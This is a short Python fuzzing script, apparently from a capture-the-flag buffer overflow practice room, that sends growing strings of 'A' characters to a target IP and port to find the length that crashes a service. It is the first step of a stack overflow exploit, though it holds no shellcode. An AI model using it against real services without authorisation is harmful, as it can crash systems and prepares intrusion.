import socket, sys, time

ip = "" # change me, string value
port = 1234 # int value, not string
timeout = 5

buf = []
counter = 100

while len(buf) < 30:
    buf.append("A" * counter)
    counter += 100

for string in buf:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Sending %s bytes" % len(string))
        s.send("" + string + "\r\n") # for this room, blank string should be "OVERFLOW<tasknumber-1> "
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)


